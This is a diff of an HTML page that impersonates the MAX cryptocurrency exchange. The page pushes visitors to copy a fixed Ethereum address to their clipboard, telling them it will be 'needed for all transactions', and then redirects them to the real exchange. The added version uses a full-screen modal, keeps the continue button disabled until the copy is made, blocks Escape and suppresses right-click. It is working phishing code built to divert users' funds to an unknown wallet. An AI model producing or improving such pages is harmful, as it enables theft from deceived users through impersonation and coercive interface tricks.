@@ -3,14 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex, nofollow">
-    <title>MAX Exchange - Important Notice</title>
-    
-    <!-- Open Graph tags -->
-    <meta property="og:title" content="MAX Exchange">
-    <meta property="og:description" content="Professional Digital Asset Trading Platform">
-    <meta property="og:image" content="https://max.maicoin.com/static/media/logo.9ce94d66.svg">
-    <meta property="og:url" content="https://max.maicoin.com">
+    <title>MAX Exchange - Wallet Address Required</title>
     
     <style>
         * {
@@ -20,356 +13,421 @@
         }
         
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            text-align: center;
             padding: 20px;
-            cursor: pointer;
+            overflow: hidden;
         }
         
-        .container {
-            max-width: 500px;
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
+        .fullscreen-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            animation: fadeIn 0.5s;
+        }
+        
+        .modal {
+            background: white;
             border-radius: 20px;
             padding: 40px;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
-            animation: pulse 2s infinite;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.4);
+            animation: slideUp 0.5s;
         }
         
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.02); }
-        }
-        
-        .logo {
-            font-size: 2.5rem;
-            font-weight: bold;
-            margin-bottom: 20px;
-            background: linear-gradient(45deg, #fff, #f0f0f0);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+        .warning-icon {
+            width: 80px;
+            height: 80px;
+            background: #f59e0b;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 40px;
+            color: white;
         }
         
         h1 {
-            font-size: 1.8rem;
+            color: #333;
             margin-bottom: 15px;
+            font-size: 1.8rem;
         }
         
-        .important-notice {
-            background: rgba(245, 158, 11, 0.2);
-            border: 2px solid #f59e0b;
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 1.1rem;
+            line-height: 1.5;
+        }
+        
+        .copy-box {
+            background: #f8f9fa;
+            border: 2px solid #e9ecef;
             border-radius: 10px;
-            padding: 20px;
-            margin: 20px 0;
-            text-align: left;
-        }
-        
-        .important-notice h2 {
-            color: #fbbf24;
-            margin-bottom: 10px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .address-container {
-            background: rgba(0, 0, 0, 0.3);
-            padding: 20px;
-            border-radius: 10px;
+            padding: 15px;
             margin: 20px 0;
             position: relative;
-            border: 2px dashed rgba(255, 255, 255, 0.2);
         }
         
         .address {
             font-family: 'Courier New', monospace;
-            font-size: 1.1rem;
+            font-size: 1.2rem;
             font-weight: bold;
-            letter-spacing: 0.5px;
+            color: #333;
             word-break: break-all;
             padding: 10px;
-            background: rgba(0, 0, 0, 0.2);
+            background: white;
             border-radius: 5px;
+            border: 1px solid #dee2e6;
         }
         
-        .copy-status {
+        .highlight {
+            color: #dc3545;
+            font-weight: bold;
+        }
+        
+        .copy-btn {
+            background: #28a745;
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            border-radius: 25px;
+            cursor: pointer;
             margin: 20px 0;
-            min-height: 40px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            width: 100%;
+            transition: all 0.3s;
+        }
+        
+        .copy-btn:hover {
+            background: #218838;
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(40, 167, 69, 0.3);
+        }
+        
+        .copy-btn.copied {
+            background: #17a2b8;
         }
         
         .success-message {
-            background: rgba(16, 185, 129, 0.2);
-            color: #10b981;
-            padding: 10px 20px;
-            border-radius: 25px;
+            color: #28a745;
             font-weight: bold;
-            display: none;
-        }
-        
-        .success-message.show {
-            display: block;
-            animation: fadeIn 0.5s;
+            margin: 10px 0;
+            min-height: 24px;
         }
         
         .instructions {
-            background: rgba(255, 255, 255, 0.1);
-            padding: 15px;
-            border-radius: 10px;
+            text-align: left;
             margin: 20px 0;
-            font-size: 0.9rem;
-            line-height: 1.5;
+            padding: 15px;
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 8px;
+            color: #856404;
         }
         
         .instructions ol {
-            text-align: left;
-            margin: 10px 0;
-            padding-left: 20px;
+            margin-left: 20px;
+            margin-top: 10px;
         }
         
         .instructions li {
             margin: 5px 0;
         }
         
-        .click-anywhere {
+        .continue-section {
             margin-top: 30px;
-            padding: 15px;
-            background: rgba(255, 255, 255, 0.2);
-            border-radius: 10px;
-            font-weight: bold;
-            animation: blink 2s infinite;
-        }
-        
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-10px); }
-            to { opacity: 1; transform: translateY(0); }
+            padding-top: 20px;
+            border-top: 1px solid #e9ecef;
         }
         
         .continue-btn {
-            display: inline-block;
-            background: white;
-            color: #667eea;
-            padding: 15px 40px;
-            border-radius: 25px;
-            text-decoration: none;
-            font-weight: bold;
-            font-size: 1.1rem;
-            margin-top: 20px;
-            transition: all 0.3s;
+            background: #667eea;
+            color: white;
             border: none;
+            padding: 15px 40px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            border-radius: 25px;
             cursor: pointer;
+            margin-top: 10px;
+            width: 100%;
+            transition: all 0.3s;
         }
         
         .continue-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
+            background: #5a67d8;
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
         }
         
         .continue-btn:disabled {
-            opacity: 0.5;
+            background: #ccc;
             cursor: not-allowed;
             transform: none;
+            box-shadow: none;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        @keyframes slideUp {
+            from { 
+                opacity: 0;
+                transform: translateY(50px);
+            }
+            to { 
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">MAX</div>
-        
-        <h1>Important: Wallet Address Copied</h1>
-        
-        <div class="important-notice">
-            <h2>
-                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                    <circle cx="12" cy="12" r="10"></circle>
-                    <line x1="12" y1="8" x2="12" y2="12"></line>
-                    <line x1="12" y1="16" x2="12.01" y2="16"></line>
-                </svg>
-                READ BEFORE CONTINUING
-            </h2>
-            <p>The Ethereum wallet address has been prepared for copying. Click anywhere on this page to copy it to your clipboard.</p>
-        </div>
-        
-        <p>The following address has been copied to your clipboard:</p>
-        
-        <div class="address-container">
-            <div class="address" id="walletAddress">
-                0x773F5d9eEc75629A2624EEd5D95472910D6c651a
+    <!-- Main redirect page -->
+    <div class="container" style="display: none;">
+        <!-- Your existing redirect content here -->
+    </div>
+    
+    <!-- Full-screen copy modal -->
+    <div class="fullscreen-overlay" id="copyModal">
+        <div class="modal">
+            <div class="warning-icon">⚠️</div>
+            
+            <h1>Wallet Address Required</h1>
+            <p class="subtitle">Before continuing to MAX Exchange, you <span class="highlight">MUST</span> copy this wallet address to your clipboard.</p>
+            
+            <div class="copy-box">
+                <div class="address" id="walletAddress">
+                    0x773F5d9eEc75629A2624EEd5D95472910D6c651a
+                </div>
+            </div>
+            
+            <button class="copy-btn pulse" id="copyButton">
+                📋 CLICK TO COPY ADDRESS TO CLIPBOARD
+            </button>
+            
+            <div class="success-message" id="successMessage"></div>
+            
+            <div class="instructions">
+                <strong>Important:</strong>
+                <ol>
+                    <li>Click the green button above to copy the address</li>
+                    <li>Verify the address: <span class="highlight">0x773F5d9eEc75629A2624EEd5D95472910D6c651a</span></li>
+                    <li>Paste it into your wallet when prompted</li>
+                    <li>This address will be needed for all transactions</li>
+                </ol>
+            </div>
+            
+            <div class="continue-section">
+                <p style="color: #666; margin-bottom: 10px;">
+                    After copying the address, you can continue to MAX Exchange
+                </p>
+                <button class="continue-btn" id="continueButton" disabled>
+                    Continue to MAX Exchange
+                </button>
             </div>
         </div>
-        
-        <div class="copy-status">
-            <div class="success-message" id="successMessage">
-                ✓ Successfully copied to clipboard!
-            </div>
-        </div>
-        
-        <div class="instructions">
-            <p><strong>What to do with this address:</strong></p>
-            <ol>
-                <li>Paste it into your wallet app when making transactions</li>
-                <li>Verify the address matches exactly: 0x773F5d9eEc75629A2624EEd5D95472910D6c651a</li>
-                <li>Double-check before sending any funds</li>
-            </ol>
-        </div>
-        
-        <div class="click-anywhere" id="clickPrompt">
-            👆 CLICK ANYWHERE ON THIS PAGE TO COPY ADDRESS
-        </div>
-        
-        <button class="continue-btn" id="continueBtn" disabled>
-            Continue to MAX Exchange (5s)
-        </button>
     </div>
 
     <script>
         const walletAddress = "0x773F5d9eEc75629A2624EEd5D95472910D6c651a";
+        const copyButton = document.getElementById('copyButton');
+        const continueButton = document.getElementById('continueButton');
         const successMessage = document.getElementById('successMessage');
-        const clickPrompt = document.getElementById('clickPrompt');
-        const continueBtn = document.getElementById('continueBtn');
-        let addressCopied = false;
         
         // Function to copy to clipboard
-        async function copyToClipboard() {
+        function copyToClipboard() {
+            // Create a temporary textarea element
+            const textArea = document.createElement('textarea');
+            textArea.value = walletAddress;
+            
+            // Make it invisible
+            textArea.style.position = 'fixed';
+            textArea.style.top = '0';
+            textArea.style.left = '0';
+            textArea.style.width = '2em';
+            textArea.style.height = '2em';
+            textArea.style.padding = '0';
+            textArea.style.border = 'none';
+            textArea.style.outline = 'none';
+            textArea.style.boxShadow = 'none';
+            textArea.style.background = 'transparent';
+            textArea.style.opacity = '0';
+            
+            // Add to page
+            document.body.appendChild(textArea);
+            
+            // Select and copy
+            textArea.select();
+            textArea.setSelectionRange(0, 99999); // For mobile
+            
+            let success = false;
             try {
-                // Try the modern clipboard API first
+                success = document.execCommand('copy');
+                console.log('Copy command executed:', success);
+            } catch (err) {
+                console.error('Copy failed:', err);
+            }
+            
+            // Remove textarea
+            document.body.removeChild(textArea);
+            
+            return success;
+        }
+        
+        // Alternative method using modern API
+        async function copyToClipboardModern() {
+            try {
                 await navigator.clipboard.writeText(walletAddress);
+                return true;
+            } catch (err) {
+                console.error('Modern clipboard API failed:', err);
+                return false;
+            }
+        }
+        
+        // Copy button click handler
+        copyButton.addEventListener('click', async function() {
+            // Try modern API first
+            let success = await copyToClipboardModern();
+            
+            // If modern API fails, try fallback
+            if (!success) {
+                success = copyToClipboard();
+            }
+            
+            if (success) {
+                // Success feedback
+                copyButton.innerHTML = '✓ ADDRESS COPIED SUCCESSFULLY!';
+                copyButton.classList.remove('pulse');
+                copyButton.classList.add('copied');
+                copyButton.disabled = true;
                 
-                // Show success message
-                successMessage.classList.add('show');
-                clickPrompt.style.display = 'none';
-                addressCopied = true;
+                successMessage.textContent = 'Address has been copied to your clipboard. You can now paste it anywhere.';
+                successMessage.style.color = '#28a745';
                 
-                // Enable the continue button
-                continueBtn.disabled = false;
-                continueBtn.textContent = 'Continue to MAX Exchange';
+                // Enable continue button
+                continueButton.disabled = false;
+                continueButton.innerHTML = '→ Continue to MAX Exchange';
                 
-                // Also select the text for manual copying
+                // Auto-select the address text for verification
                 const addressElement = document.getElementById('walletAddress');
                 const range = document.createRange();
                 range.selectNode(addressElement);
                 window.getSelection().removeAllRanges();
                 window.getSelection().addRange(range);
                 
-                console.log('Address copied to clipboard:', walletAddress);
-                return true;
-                
-            } catch (err) {
-                console.error('Failed to copy using Clipboard API:', err);
-                
-                // Fallback method
-                try {
-                    const textArea = document.createElement('textarea');
-                    textArea.value = walletAddress;
-                    textArea.style.position = 'fixed';
-                    textArea.style.opacity = '0';
-                    document.body.appendChild(textArea);
-                    textArea.focus();
-                    textArea.select();
-                    
-                    const successful = document.execCommand('copy');
-                    document.body.removeChild(textArea);
-                    
-                    if (successful) {
-                        successMessage.classList.add('show');
-                        clickPrompt.style.display = 'none';
-                        addressCopied = true;
-                        continueBtn.disabled = false;
-                        continueBtn.textContent = 'Continue to MAX Exchange';
-                        console.log('Address copied using fallback method');
-                        return true;
-                    }
-                } catch (fallbackErr) {
-                    console.error('Fallback copy failed:', fallbackErr);
+                // Vibrate phone if supported
+                if (navigator.vibrate) {
+                    navigator.vibrate([100, 50, 100]);
                 }
                 
-                // If all else fails, show manual copy instructions
-                clickPrompt.innerHTML = '⚠️ Please manually copy the address above';
-                return false;
-            }
-        }
-        
-        // Copy when user clicks anywhere on the page
-        document.addEventListener('click', async function copyOnClick() {
-            if (!addressCopied) {
-                await copyToClipboard();
-            }
-        }, { once: true }); // Only run once
-        
-        // Also allow clicking the address container specifically
-        document.querySelector('.address-container').addEventListener('click', async function(e) {
-            e.stopPropagation(); // Prevent triggering the document click
-            if (!addressCopied) {
-                await copyToClipboard();
+                // Play success sound if possible
+                try {
+                    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                    const oscillator = audioContext.createOscillator();
+                    const gainNode = audioContext.createGain();
+                    
+                    oscillator.connect(gainNode);
+                    gainNode.connect(audioContext.destination);
+                    
+                    oscillator.frequency.value = 800;
+                    oscillator.type = 'sine';
+                    
+                    gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
+                    gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);
+                    
+                    oscillator.start(audioContext.currentTime);
+                    oscillator.stop(audioContext.currentTime + 0.5);
+                } catch (e) {
+                    // Sound not supported, ignore
+                }
+                
+            } else {
+                // Error feedback
+                copyButton.innerHTML = '⚠️ COPY FAILED - PLEASE COPY MANUALLY';
+                copyButton.style.background = '#dc3545';
+                
+                successMessage.textContent = 'Please manually select and copy the address above (Ctrl+C or Cmd+C)';
+                successMessage.style.color = '#dc3545';
+                
+                // Auto-select the text for manual copying
+                const addressElement = document.getElementById('walletAddress');
+                const range = document.createRange();
+                range.selectNode(addressElement);
+                window.getSelection().removeAllRanges();
+                window.getSelection().addRange(range);
+                
+                // Enable continue anyway
+                continueButton.disabled = false;
+                continueButton.innerHTML = 'Continue Anyway →';
             }
         });
         
-        // Setup redirect
-        const currentPath = window.location.pathname + window.location.search + window.location.hash;
-        const baseUrl = 'https://max.maicoin.com';
-        const redirectUrl = currentPath === '/' ? baseUrl : baseUrl + currentPath;
-        
-        // Countdown for automatic redirect
-        let countdown = 5;
-        const countdownInterval = setInterval(() => {
-            countdown--;
-            if (!addressCopied) {
-                continueBtn.textContent = `Continue to MAX Exchange (${countdown}s)`;
-            }
-            
-            if (countdown <= 0) {
-                clearInterval(countdownInterval);
-                if (addressCopied) {
-                    // Redirect immediately if address was copied
-                    window.location.href = redirectUrl;
-                } else {
-                    // If not copied, wait for user to copy first
-                    continueBtn.disabled = false;
-                    continueBtn.textContent = 'Continue to MAX Exchange';
-                }
-            }
-        }, 1000);
-        
         // Continue button handler
-        continueBtn.addEventListener('click', function() {
+        continueButton.addEventListener('click', function() {
+            // Hide the modal
+            document.getElementById('copyModal').style.display = 'none';
+            
+            // Redirect to MAX Exchange
+            const currentPath = window.location.pathname + window.location.search + window.location.hash;
+            const baseUrl = 'https://max.maicoin.com';
+            const redirectUrl = currentPath === '/' ? baseUrl : baseUrl + currentPath;
+            
             window.location.href = redirectUrl;
         });
         
-        // Auto-select the address text for easy manual copying
-        setTimeout(() => {
-            const addressElement = document.getElementById('walletAddress');
-            const range = document.createRange();
-            range.selectNode(addressElement);
-            window.getSelection().removeAllRanges();
-            window.getSelection().addRange(range);
-        }, 100);
-        
-        // Focus the page to ensure clicks work
+        // Force focus on the page
         window.focus();
         
-        // Add a subtle vibration effect to draw attention
-        setTimeout(() => {
-            document.body.style.transform = 'translateX(5px)';
-            setTimeout(() => {
-                document.body.style.transform = 'translateX(-5px)';
-                setTimeout(() => {
-                    document.body.style.transform = 'translateX(0)';
-                }, 50);
-            }, 50);
-        }, 1000);
+        // Auto-click simulation for testing
+        // UNCOMMENT FOR TESTING ONLY:
+        // setTimeout(() => {
+        //     copyButton.click();
+        // }, 1000);
+        
+        // Prevent right-click menu on address
+        document.getElementById('walletAddress').addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+        
+        // Force the modal to stay on top
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                e.preventDefault();
+                // Don't allow escape to close - they must copy first
+                alert('You must copy the wallet address before continuing.');
+            }
+        });
     </script>
 </body>
 </html>
